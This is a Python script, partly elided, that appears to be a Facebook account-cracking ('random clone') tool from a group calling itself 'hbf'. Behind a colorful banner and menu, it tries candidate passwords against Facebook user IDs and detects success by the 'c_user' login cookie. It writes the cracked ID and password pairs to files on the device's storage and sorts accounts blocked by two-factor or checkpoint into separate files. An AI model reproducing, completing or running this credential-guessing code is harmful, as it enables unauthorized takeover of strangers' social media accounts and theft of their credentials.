...
#team name hbf
#tottaly written by Anonymous 360 Khawaja
#!/usr/bin/python3 
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; Anonymous \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
ha = current.day
today = date.today()
Anonymous2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
import random
cokbrut=[]
...
\033[1;37m╔\033[1;36mᎮ𝙰Ꭾ𝙸\033[1;37m════════════════════════════════════════════════════
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER    \033[1;31m    ➟   \033[1;32m꧁𓊈𒆜 Ꮧ𝙽𝙾𝙽𝚈𝙼𝙾𝚄Ꭶ 𒆜𓊉꧂      \033[1;31m      ‌‌‌‌‌‌‌
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m ➟   \033[1;32m   Ꮧ𝙽𝙾𝙽𝚈𝙼𝙾𝚄Ꭶ         \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mTELEGRAM   \033[1;31m ➟  \033[1;32m    t.me/Anonymous_Raihan    \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mTwitter   \033[1;31m   ➟   \033[1;32m    Ꮧ𝙽𝙾𝙽𝚈𝙼𝙾𝚄Ꭶ    \033[1;31m   
\033[1;31m│\033[1;37m☞  \033[1;32mVERSION  \033[1;31m    ➟   \033[1;32m1.2   \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mGROUP\033[1;31m : \033[1;32mᎻ𝙰𝙲𝙺𝙸𝙽𝙶 Ꭲ𝚄𝚃𝙾𝚁𝙸𝙰𝙻\033[1;37m {\033[1;36mᎪᎻᎢ\033[1;37m}   \033[1;31m          
\033[1;37m╚\033[1;36mᎮ𝙰Ꭾ𝙸\033[1;37m══════\033[41m\033[1;37m[ Ꮋ𝙰𝙲𝙺𝙸𝙽𝙶 Ꭲ𝚄𝚃𝙾𝚁𝙸𝙰𝙻 ]\x1b[0m══════\033[1;36mᎮ𝙰Ꭾ𝙸 
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by hbf team(owner) Anonymous
...
def XYZ():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════')
    print(f"\t      {WHITE}[{EXTRA} {AnonymousT()} {WHITE}]")
    print(f" {GREEN}PREMIUM USER          {WHITE}: {GREEN}Mr {ORANGE} {NameX}")
    print(f"{BLUE}══════════════════════════════════════════════════")
    print(f"{RED}[01] {WHITE}PAK RANDOM CLONE ")
    print(f"{RED}[02] {WHITE}FEEDBACK 🙂 ")
    print(f"{RED}[03] {WHITE}FOLLOW MY FACEBOOK PAGE ")
    print(f"{RED}[00] {WHITE}EXIT PROGRAM ")
    print(f"\033[1;91m====================================================")
    Anonymous = input("[√] CHOOSE : ")
    if Anonymous in ["1","01"]:
        passx()
    elif Anonymous in ["2","02"]:
        os.system("xdg-open https://t.me/Anonymous_Raihan")
        XYZ()
    elif Anonymous in ["3","03"]:
        os.system("xdg-open https://www.facebook.com/Anonymous.AR.Official")
        XYZ()
    elif Anonymous in ["0","00"]:
       exit()
    else:
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/Anonymous.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/Anonymous-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio Anonymous_OK.mp3")
                print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ ' '+Jawnx(uid)+' ')
                cek_apk(session,coki)
                open('/sdcard/Anonymous.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio Anonymous_2F.mp3")
                    print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/Anonymous-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                  #  os.system("play-audio Anonymous_CP.mp3")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[Ꮧ𝙽𝙾𝙽𝚈𝙼𝙾𝚄Ꭶ 🔥] [%s] \33[1;97m[OK:%s{Anonymous2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
